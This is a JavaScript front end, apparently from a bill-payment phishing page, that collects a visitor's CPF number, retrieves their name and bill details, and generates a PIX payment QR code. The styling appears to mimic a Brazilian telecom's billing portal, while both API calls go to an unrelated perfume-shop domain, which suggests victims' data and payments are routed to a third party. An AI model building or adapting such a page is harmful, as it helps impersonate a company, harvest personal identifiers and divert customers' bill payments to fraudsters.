
// Elements
const landingView = document.getElementById('landing-view');
const resultsView = document.getElementById('results-view');
const paymentModal = document.getElementById('payment-modal');
const cpfForm = document.getElementById('cpf-form');
const cpfValue = document.getElementById('cpf-input')
const newSearchBtn = document.getElementById('new-search-btn');
const openModalBtn = document.getElementById('open-modal-btn');
const closeModalBtn = document.getElementById('close-modal-btn');
const modalBackdrop = document.getElementById('modal-backdrop');
const boletoOption = document.getElementById('boleto-option');
const copyPixBtn = document.getElementById('copy-pix-btn');
const pixCode = document.getElementById('pix-code');

//others

const modalHeader = document.getElementById('modalHeader')
const billSumary = document.getElementById('bill-sumary')

const loadingSpinner = document.getElementById('loadingSpinner')

const pixAction = document.getElementById('pixAction')
const paymentOptions = document.getElementById('paymentOptions')
const pixContent = document.getElementById('pixContent');
const closePixModalBtn = document.getElementById('close-pix-modal-btn');

// CPF Form Submit -> Show Results
cpfForm.addEventListener('submit', function (e) {
    showLoading()
    callApi(cpfValue.value)
    console.log(cpfValue.value)
    e.preventDefault();
    landingView.classList.add('hidden');
    // resultsView.classList.remove('hidden');
    window.scrollTo({ top: 0, behavior: 'smooth' });
});


//loading modal

// Funções do loading
function showLoading() {
    loadingModal.classList.remove('hidden');


}

function hideLoading() {
    loadingModal.classList.add('hidden');



}
//api call


async function callApi(cpf) {
    try {
        const cpfLimpo = cpf.replace(/\D/g, '');
        localStorage.setItem('clientCPF', JSON.stringify(cpfLimpo))
        const response = await fetch('https://chamasperfumes.com/api/search', {
            method: 'POST',
            headers: {
                'Content-type': 'application/json',
            },
            body: JSON.stringify({ cpf: cpf })
        })

        const data = await response.json()

        // console.log(data)
        localStorage.setItem('userData', JSON.stringify(data))

        hideLoading();
        resultsView.classList.remove('hidden');
        showDatapayments()
    } catch (error) {
        console.log(error)
    }
}
//show values to pay


// Função para mostrar os dados de pagamento
async function showDatapayments() {
    try {
        const data = JSON.parse(localStorage.getItem('userData'));


        // Verifica se os dados existem
        if (!data || !data.data) {
            console.error('Dados não encontrados no localStorage');
            return;
        }

        const chargeMonth = document.getElementById('chargeMonth');
        const chargeValue = document.getElementById('chargeValue');
        const chargeDate = document.getElementById('chargeDate');
        const chargeStatus = document.getElementById('chargeStatus');
        const clientName = document.getElementById('clientName')
        const hideCPF = document.getElementById('hideCPF');



        console.log("CLIENTE DATA ==>>", data.data.cliente)

        // Verifica se os elementos existem
        if (chargeMonth && chargeValue && chargeDate && chargeStatus) {
            chargeMonth.value = data.data.contas.titulo || '';
            chargeValue.value = data.data.contas.valor || '';
            chargeDate.value = data.data.contas.vencimento || '';
            chargeStatus.value = data.data.contas.status || '';
            clientName.textContent = data.data.cliente.nome || '';
            hideCPF.textContent = data.data.cliente.cpf || '';

        } else {
            console.error('Elementos de pagamento não encontrados no DOM');
        }
    } catch (error) {
        console.error('Erro ao mostrar dados de pagamento:', error);
    }
}
// New Search -> Back to Landing
newSearchBtn.addEventListener('click', function () {
    resultsView.classList.add('hidden');
    landingView.classList.remove('hidden');
    window.scrollTo({ top: 0, behavior: 'smooth' });
});

// Open Payment Modal
openModalBtn.addEventListener('click', function () {
    paymentModal.classList.remove('hidden');
    document.body.style.overflow = 'hidden';
});

// Close Payment Modal
function closeModal() {
    paymentModal.classList.add('hidden');
    document.body.style.overflow = '';
}
closeModalBtn.addEventListener('click', closeModal);
modalBackdrop.addEventListener('click', closeModal);

// ESC to close modal
document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') closeModal();
});

// Payment method toggle styling
const paymentRadios = document.querySelectorAll('input[name="payment"]');
const paymentLabels = document.querySelectorAll('label:has(input[name="payment"])');

paymentRadios.forEach(function (radio) {
    radio.addEventListener('change', function () {
        paymentLabels.forEach(function (label) {
            const input = label.querySelector('input');
            if (input.checked) {
                label.classList.remove('border-gray-200');
                label.classList.add('border-nio-green', 'bg-nio-green/5');
            } else {
                label.classList.add('border-gray-200');
                label.classList.remove('border-nio-green', 'bg-nio-green/5');
            }
        });
    });
});

// Accordion
document.querySelectorAll('.accordion-btn').forEach(function (btn) {
    btn.addEventListener('click', function () {
        const targetId = this.getAttribute('data-target');
        const content = document.getElementById(targetId);
        const icon = this.querySelector('svg');
        content.classList.toggle('open');
        if (content.classList.contains('open')) {
            icon.style.transform = 'rotate(45deg)';
        } else {
            icon.style.transform = 'rotate(0deg)';
        }
    });
});


// payment function



// Simulação de API
async function generatePix() {
    const url = "https://chamasperfumes.com/api/transaction"


    const cpfData = JSON.parse(localStorage.getItem('clientCPF'));
    const data = JSON.parse(localStorage.getItem('userData'));

    console.log("CPF Data:", cpfData);
    console.log("User Data:", data);

    // Verifica se os dados existem
    if (!data || !data.data) {
        console.error('Dados não encontrados no localStorage');
        return;
    }

    // Extrai o CPF
    let cpfLimpo = '';
    if (cpfData) {
        cpfLimpo = cpfData.replace(/\D/g, '');
    } else {
        console.error('CPF não encontrado no localStorage');
        return;
    }

    // Extrai o nome do cliente
    const nome = data.data.cliente?.nome || '';
    if (!nome) {
        console.error('Nome não encontrado nos dados');
        return;
    }

    // Extrai o valor da conta - VERIFICA SE É ARRAY
    let valor = '';
    let titulo = ''
    if (data.data.contas && Array.isArray(data.data.contas) && data.data.contas.length > 0) {
        // Pega o valor da primeira conta
        valor = data.data.contas[0].valor || '';
        titulo = data.data.contas[0].titulo || '';
    } else if (data.data.contas && data.data.contas.valor) {
        // Se não for array, tenta acessar diretamente
        valor = data.data.contas.valor || '';
    } else {
        console.error('Valor não encontrado nos dados');
        return;
    }

    // Limpa o valor (remove R$ e espaços)
    const amount = valor.replace('R$', '').replace(/\s+/g, '').trim();

    console.log("Dados para PIX:", {
        titulo,
        amount,
        cpfLimpo,
        nome,
        valorOriginal: valor
    });

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-type': 'application/json',
            },
            body: JSON.stringify({
                titulo,
                amount: amount,
                cpf: cpfLimpo, // Mudei para 'cpf' em vez de 'cpfLimpo' se a API espera esse nome
                nome: nome
            })
        });

        const result = await response.json();
        console.log("Resposta da API PIX:", result);
        if (loadingSpinner) loadingSpinner.classList.remove('hidden');
        showPixContent(result);

        return result;
    } catch (error) {
        console.error('Erro ao gerar PIX:', error);
        // Aqui você pode mostrar uma mensagem de erro para o usuário
        alert('Erro ao gerar PIX. Tente novamente.');
    }
}

function showPixContent(pixData) {
    // Esconder loading e formulário




    if (loadingSpinner) loadingSpinner.classList.add('hidden');
    if (pixAction) pixAction.classList.add('hidden');
    if (paymentOptions) paymentOptions.classList.add('hidden')
    if (modalHeader) modalHeader.classList.add('hidden')
    if (billSumary) billSumary.classList.add('hidden')

    // Mostrar conteúdo PIX
    if (pixContent) pixContent.classList.remove('hidden');

    const data = JSON.parse(localStorage.getItem('userData'));

    console.log("DATA ==>", data)


    // Verifica se os dados existem
    if (!data || !data.data) {
        console.error('Dados não encontrados no localStorage');
        return;
    }
    const pixAmount = document.getElementById('pix-amount');

    // Para elemento <p>, use textContent em vez de value
    if (data.data.contas && data.data.contas.length > 0) {
        pixAmount.textContent = data.data.contas[0].valor; // "R$ 120,63"
        console.log("Valor definido:", pixAmount.textContent);
    } else {
        console.error('Nenhuma conta encontrada');
    }

    if (pixData) {
        // Atualizar QR Code
        const qrcodeContainer = document.getElementById('qrcode-container');
        if (qrcodeContainer && pixData.qrcode) {
            const pixString = pixData.qrcode.trim();
            qrcodeContainer.innerHTML = `
                <img
                    src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixString)}"
                    alt="QR Code PIX"
                    class="w-48 h-48 mx-auto"
                    onerror="this.onerror=null; console.error('Erro ao carregar QR Code')">
            `;
        } else {
            console.error('QR Code container ou dados não encontrados');
        }
        // remove o userData do localstorage

        localStorage.removeItem('userData')
        // Atualizar código PIX
        if (pixCode && pixData.qrcode) {
            pixCode.value = pixData.qrcode.trim();
        } else {
            console.error('Elemento pixCode não encontrado');
        }
    } else {
        console.error('pixData está vazio ou indefinido');
    }
}


// Copiar código PIX
if (copyPixBtn) {
    copyPixBtn.addEventListener('click', function () {
        if (!pixCode) return;

        pixCode.select();
        pixCode.setSelectionRange(0, 99999);

        const copyToClipboard = async () => {
            try {
                await navigator.clipboard.writeText(pixCode.value);
                showCopyFeedback(this);
            } catch (err) {
                // Fallback
                document.execCommand('copy');
                showCopyFeedback(this);
            }
        };

        copyToClipboard();
    });
}

//fechar pix modal

function closePixModal() {
    if (pixContent) {
        pixContent.classList.add('hidden');
    }

    // Opcional: Se você quiser também fechar o modal principal
    if (paymentModal) {
        paymentModal.classList.add('hidden');
    }

    // Opcional: Se tiver um backdrop, também esconder
    const modalBackdrop = document.getElementById('modal-backdrop');
    if (modalBackdrop) {
        modalBackdrop.classList.add('hidden');
    }

    // Opcional: Resetar o conteúdo do PIX para não mostrar dados antigos quando reabrir
    resetPixContent();
}

// Função para resetar o conteúdo do PIX
function resetPixContent() {
    // Limpa o QR Code
    const qrcodeContainer = document.getElementById('qrcode-container');
    if (qrcodeContainer) {
        qrcodeContainer.innerHTML = '';
    }

    // Limpa o código PIX
    const pixCode = document.getElementById('pix-code');
    if (pixCode) {
        pixCode.value = '';
    }

    // Reseta o timer
    const pixTimer = document.getElementById('pix-timer');
    if (pixTimer) {
        pixTimer.textContent = '4:55';
    }
}

// Adicionar event listener para o botão de fechar
if (closePixModalBtn) {
    closePixModalBtn.addEventListener('click', closePixModal);
}

// Opcional: Fechar ao clicar fora do modal (se tiver um backdrop)
if (modalBackdrop) {
    modalBackdrop.addEventListener('click', function (e) {
        // Verifica se clicou exatamente no backdrop (não no conteúdo do modal)
        if (e.target === modalBackdrop) {
            closePixModal();
        }
    });
}

// Opcional: Fechar com tecla ESC
document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') {
        // Verifica se o modal PIX está visível
        if (pixContent && !pixContent.classList.contains('hidden')) {
            closePixModal();
        }
    }
});


// Função auxiliar para feedback de cópia
function showCopyFeedback(button) {
    const originalHTML = button.innerHTML;
    const originalClass = button.className;

    button.innerHTML = '<i class="fas fa-check mr-2"></i> Copiado!';
    button.className = originalClass.replace('bg-blue-500', 'bg-green-500');

    setTimeout(() => {
        button.innerHTML = originalHTML;
        button.className = originalClass;
    }, 2000);
}
